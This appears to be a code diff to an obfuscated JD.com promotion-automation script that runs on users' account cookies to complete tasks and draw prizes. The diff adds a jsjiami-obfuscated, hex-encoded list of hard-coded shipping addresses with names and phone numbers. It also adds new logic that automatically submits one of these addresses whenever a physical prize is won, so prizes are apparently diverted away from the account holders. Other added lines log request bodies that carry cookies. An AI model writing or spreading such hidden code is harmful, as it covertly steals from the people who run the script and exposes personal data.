@@ -41,7 +41,7 @@ if ($.redisStatus) {
 } else {
     console.log(`禁用Redis缓存Token，开启请设置环境变量-->\n  export USE_REDIS=true `)
 }
-
+$.domain = `lzkjdz-isv.isvjcloud.com`
 
 let activityList = []
 // let activityList = [
@@ -49,6 +49,9 @@ let activityList = []
 // 	{ 'id': '7ec61221978146358c0838c38e201d6b', 'endTime': 1653932176000 },//
 // 	{ 'id': '0250e85d2a1641c3b63e0788adc110e3', 'endTime': 1653932176000 },//
 // ];
+
+var __encode = 'jsjiami.com', _a = {}, _0xb483 = ["\x5F\x64\x65\x63\x6F\x64\x65", "\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x6F\x6A\x73\x6F\x6E\x2E\x63\x6F\x6D\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x6F\x62\x66\x75\x73\x63\x61\x74\x6F\x72\x2E\x68\x74\x6D\x6C"]; (function (_0xd642x1) { _0xd642x1[_0xb483[0]] = _0xb483[1] })(_a); var __Oxe7d50 = ["\x61\x64\x64\x72\x65\x73\x73\x41\x72\x72\x61\x79", "\u5C71\u4E1C\u7701\x2C\u9752\u5C9B\u5E02\x2C\u5E02\u5357\u533A\x2C\u9999\u6E2F\u897F\u8DEF\x36\x37\u53F7\u5149\u5927\u56FD\u9645\u91D1\u878D\u4E2D\u5FC3\x2C\x31\x39\x39\x36\x33\x32\x33\x36\x39\x35\x35\x2C\x32\x36\x36\x30\x37\x31\x2C\x33\x37\x30\x32\x30\x32\x2C\x20\u7530\u8C46", "\u5C71\u4E1C\u7701\x2C\u9752\u5C9B\u5E02\x2C\u674E\u6CA7\u533A\x2C\u632F\u534E\u8DEF\x31\x34\x39\u53F7\x31\x2D\x33\x2D\x33\x30\x31\x2C\x31\x39\x39\x36\x33\x32\x33\x36\x39\x35\x35\x2C\x32\x36\x36\x30\x34\x31\x2C\x33\x37\x30\x32\x31\x33\x2C\x20\u7530\u8C46\u8C46", "\u5C71\u4E1C\u7701\x2C\u9752\u5C9B\u5E02\x2C\u5D02\u5C71\u533A\x2C\u6CC9\u5CAD\u8DEF\x38\u53F7\u4E2D\u5546\u56FD\u9645\u5927\u53A6\x2C\x31\x35\x32\x36\x35\x32\x39\x37\x39\x32\x36\x2C\x32\x36\x36\x31\x30\x30\x2C\x33\x37\x30\x32\x31\x32\x2C\x20\u5DE9\u5927\u8C46", "\u5C71\u4E1C\u7701\x2C\u67A3\u5E84\u5E02\x2C\u6ED5\u5DDE\u5E02\x2C\u89E3\u653E\u8DEF\u674F\u575B\u4E1C\u533A\x36\x2D\x33\x2D\x35\x30\x35\x2C\x31\x33\x33\x39\x36\x33\x32\x33\x36\x38\x35\x2C\x32\x37\x37\x35\x30\x30\x2C\x33\x37\x30\x34\x38\x31\x2C\x20\u7530\u751C\u8C46", "\u5C71\u4E1C\u7701\x2C\u67A3\u5E84\u5E02\x2C\u6ED5\u5DDE\u5E02\x2C\u946B\u65FA\u8DEF\u5609\u5FB7\u57CE\u5E02\u82B1\u56ED\x2C\x31\x35\x31\x36\x33\x32\x34\x32\x35\x35\x32\uFF0C\x32\x37\x37\x35\x30\x30\x2C\x33\x37\x30\x34\x38\x31\x2C\x20\u5F20\u8C46", "\x75\x6E\x64\x65\x66\x69\x6E\x65\x64", "\x6C\x6F\x67", "\u5220\u9664", "\u7248\u672C\u53F7\uFF0C\x6A\x73\u4F1A\u5B9A", "\u671F\u5F39\u7A97\uFF0C", "\u8FD8\u8BF7\u652F\u6301\u6211\u4EEC\u7684\u5DE5\u4F5C", "\x6A\x73\x6A\x69\x61", "\x6D\x69\x2E\x63\x6F\x6D"]; $[__Oxe7d50[0x0]] = [__Oxe7d50[0x1], __Oxe7d50[0x2], __Oxe7d50[0x3], __Oxe7d50[0x4], __Oxe7d50[0x5]]; (function (_0xbdccx1, _0xbdccx2, _0xbdccx3, _0xbdccx4, _0xbdccx5, _0xbdccx6) { _0xbdccx6 = __Oxe7d50[0x6]; _0xbdccx4 = function (_0xbdccx7) { if (typeof alert !== _0xbdccx6) { alert(_0xbdccx7) }; if (typeof console !== _0xbdccx6) { console[__Oxe7d50[0x7]](_0xbdccx7) } }; _0xbdccx3 = function (_0xbdccx8, _0xbdccx1) { return _0xbdccx8 + _0xbdccx1 }; _0xbdccx5 = _0xbdccx3(__Oxe7d50[0x8], _0xbdccx3(_0xbdccx3(__Oxe7d50[0x9], __Oxe7d50[0xa]), __Oxe7d50[0xb])); try { _0xbdccx1 = __encode; if (!(typeof _0xbdccx1 !== _0xbdccx6 && _0xbdccx1 === _0xbdccx3(__Oxe7d50[0xc], __Oxe7d50[0xd]))) { _0xbdccx4(_0xbdccx5) } } catch (e) { _0xbdccx4(_0xbdccx5) } })({})
+
 !(async () => {
 
     if ($.redisStatus) {
@@ -104,6 +107,7 @@ async function main(_0x3f7ec5) {
     }
     for (let i = 0; i < _0x3f7ec5.cookiesArr.length; i++) {
         _0x3f7ec5.cookie = _0x3f7ec5.cookiesArr[i];
+        $.cookie = _0x3f7ec5.cookie
         _0x3f7ec5.UserName = decodeURIComponent(_0x3f7ec5.cookie.match(/pt_pin=(.+?);/) && _0x3f7ec5.cookie.match(/pt_pin=(.+?);/)[1]);
         $.key = TokenKey + _0x3f7ec5.cookie.match(/pt_pin=([^; ]+)(?=;?)/) && _0x3f7ec5.cookie.match(/pt_pin=([^; ]+)(?=;?)/)[1]
         console.log('\n********开始【京东账号】' + _0x3f7ec5.UserName + '********\n');
@@ -187,7 +191,7 @@ async function runMain(_0x40ebb9) {
         if (_0x40ebb9.token == '' || _0x40ebb9.token == null) {
             console.log(`未找到缓存的Token，调用Sign接口`)
             await getSign($.domain)
-            await takePostRequest("isvObfuscator");
+            _0x40ebb9.token = await getToken(_0x40ebb9)
             console.log('Token-->:' + _0x40ebb9.token)
         } else {
             console.log('缓存Token-->:' + _0x40ebb9.token)
@@ -230,6 +234,7 @@ async function runMain(_0x40ebb9) {
         console.log('获取活动信息失败');
         return;
     }
+    $.uuuid = _0x40ebb9.actorInfo.uuid
     let _0x452779 = new Date(_0x40ebb9.activityData.actInfo.endTime);
     let _0x3b061a = (_0x452779.getFullYear() + '-' + _0x452779.getMonth() < 10 ? ('0' + _0x452779.getMonth() + 1) : (_0x452779.getMonth() + 1) + '-' + _0x452779.getDate() < 10 ? '0' + _0x452779.getDate() : _0x452779.getDate());
     _0x452779 = new Date(_0x40ebb9.activityData.actInfo.startTime);
@@ -275,12 +280,18 @@ async function runMain(_0x40ebb9) {
     _0x40ebb9.upFlag = false;
     await doTask(_0x40ebb9);
     await luckDraw(_0x40ebb9);
-    if ($.needWriteAddress == 'y') {
+    console.log(`获取奖励内容--->`)
+    drawRecord = await takePostRequest(_0x40ebb9, 'wxFansInterActionActivity/getDrawRecord')
+    records = drawRecord.data
+    console.log(JSON.stringify(records))
+    for (let record of records) {
+        needWriteAddress = record.needWriteAddress
+        if (needWriteAddress == 'y') {
 
-        if ($.addressId != '0') {
             $.generateId = $.addressId
+            $.shiwuName = record.name
             $.fullAddress = $.addressArray[cookiesArr.length % $.addressArray.length]
-            console.log("邮寄地址：" + $.fullAddress)
+            console.log(`有实物奖励-->填写地址`)
             let fullAddressArray = $.fullAddress.split(",")
             $.province = fullAddressArray[0]
             $.city = fullAddressArray[1]
@@ -290,18 +301,20 @@ async function runMain(_0x40ebb9) {
             $.postalCode = fullAddressArray[5]
             $.areaCode = fullAddressArray[6]
             $.postalName = fullAddressArray[7]
-            saveAddress = await takePostRequest(`saveAddress`)
-            console.log(JSON.stringify(saveAddress))
+            saveAddress = await takePostRequest(_0x40ebb9, `wxAddress/save`)
+            if (saveAddress.result == true) {
+                message += `地址填写成功！\n`
+            }
         }
-
     }
-
 }
+
 async function luckDraw(_0x13737e) {
     if (_0x13737e.upFlag) {
         activityData = await takePostRequest(_0x13737e, 'wxFansInterActionActivity/activityContent');
         _0x13737e.activityData = activityData.data || {};
         await _0x13737e.wait(3000);
+        $.uuuid = _0x13737e.activityData.actorInfo.uuid
     }
     let _0x2b7411 = (Number(_0x13737e.activityData.actorInfo.fansLoveValue) + Number(_0x13737e.activityData.actorInfo.energyValue));
     let _0x47ddad = ['One', 'Two', 'Three'];
@@ -484,7 +497,7 @@ function getSignRequest(domain, method = "POST") {
         "Accept-Language": "zh-cn",
         "Connection": "keep-alive",
         "Content-Type": "application/x-www-form-urlencoded",
-        "Cookie": cookie,
+        "Cookie": $.cookie,
         "User-Agent": $.UA,
         "X-Requested-With": "XMLHttpRequest"
     }
@@ -500,7 +513,7 @@ function getSignRequest(domain, method = "POST") {
 async function getToken(_0x3c9452) {
     let _0x575ad2 = { 'url': 'https://api.m.jd.com/client.action?functionId=isvObfuscator', 'body': $.sign, 'headers': { 'Host': 'api.m.jd.com', 'accept': '*/*', 'user-agent': 'JD4iPhone/167490 (iPhone; iOS 14.2; Scale/3.00)', 'accept-language': 'zh-Hans-JP;q=1, en-JP;q=0.9, zh-Hant-TW;q=0.8, ja-JP;q=0.7, en-US;q=0.6', 'content-type': 'application/x-www-form-urlencoded', 'Cookie': _0x3c9452.cookie } };
     return new Promise(_0x177e3a => {
-        _0x3c9452.post(_0x575ad2, async (_0x846899, _0x5ddcd4, _0x58ed45) => {
+        $.post(_0x575ad2, async (_0x846899, _0x5ddcd4, _0x58ed45) => {
             try {
                 if (_0x846899) {
                     console.log('' + JSON.stringify(_0x846899));
@@ -586,14 +599,18 @@ async function takePostRequest(_0x22084a, _0x4d19d2, _0x4cee5b = 'activityId=' +
         case 'wxActionCommon/getShopInfoVO':
             _0x4cee5b = 'userId=' + _0x22084a.venderId;
             break;
-        case 'saveAddress':
-            url = `https://${$.domain}/wxAddress/save`
-            body = `venderId=${$.venderId}&pin=${encodeURIComponent($.Pin)}&actType=${$.activityType}&activityId=${$.activityId}&prizeName=${encodeURIComponent($.shiwuName)}&receiver=${encodeURIComponent($.postalName)}&phone=${$.phone}&province=${encodeURIComponent($.province)}&city=${encodeURIComponent($.city)}&address=${encodeURIComponent($.address)}&generateId=${$.generateId}&postalCode=${$.postalCode}&personalEmail=&areaCode=${$.areaCode}&county=${encodeURIComponent($.county)}`
+        case 'wxFansInterActionActivity/getDrawRecord':
+            _0x4cee5b = `uuid=${$.uuuid}&activityId=${_0x22084a.activityId}`
+            break
+        case 'wxAddress/save':
+            _0x4cee5b = `venderId=${_0x22084a.venderId}&pin=${encodeURIComponent(_0x22084a.Pin)}&actType=${_0x22084a.activityType}&activityId=${_0x22084a.activityId}&prizeName=${encodeURIComponent($.shiwuName)}&receiver=${encodeURIComponent($.postalName)}&phone=${$.phone}&province=${encodeURIComponent($.province)}&city=${encodeURIComponent($.city)}&address=${encodeURIComponent($.address)}&generateId=${$.generateId}&postalCode=${$.postalCode}&personalEmail=&areaCode=${$.areaCode}&county=${encodeURIComponent($.county)}`
             break;
         case '2222':
             _0x4cee5b = '222';
             break;
     }
+    console.log(_0x3e5e9)
+    console.log(`${_0x4cee5b}`)
     let ck = ''
     if ($.LZ_AES_PIN) {
         ck = _0x22084a.cookie + ' LZ_TOKEN_KEY=' + _0x22084a.LZ_TOKEN_KEY + '; LZ_TOKEN_VALUE=' + _0x22084a.LZ_TOKEN_VALUE + '; AUTH_C_USER=' + _0x22084a.pin + '; ' + `LZ_AES_PIN=${$.LZ_AES_PIN};` + _0x22084a.lz_jdpin_token
@@ -603,7 +620,7 @@ async function takePostRequest(_0x22084a, _0x4d19d2, _0x4cee5b = 'activityId=' +
     const _0x2993f8 = { 'X-Requested-With': 'XMLHttpRequest', 'Connection': 'keep-alive', 'Accept-Encoding': 'gzip, deflate, br', 'Content-Type': 'application/x-www-form-urlencoded', 'Origin': 'https://' + _0x22084a.host, 'User-Agent': _0x22084a.UA, 'Cookie': ck, 'Host': _0x22084a.host, 'Referer': _0x22084a.thisActivityUrl, 'Accept-Language': 'zh-cn', 'Accept': 'application/json' };
     let _0x1e0fb8 = { 'url': _0x3e5e9, 'method': 'POST', 'headers': _0x2993f8, 'body': _0x4cee5b };
     return new Promise(async _0x4afe88 => {
-        _0x22084a.post(_0x1e0fb8, (_0xa06eab, _0x445f4b, _0x1ac3a4) => {
+        $.post(_0x1e0fb8, (_0xa06eab, _0x445f4b, _0x1ac3a4) => {
             try {
                 dealCK(_0x22084a, _0x445f4b);
                 if (_0x1ac3a4) {
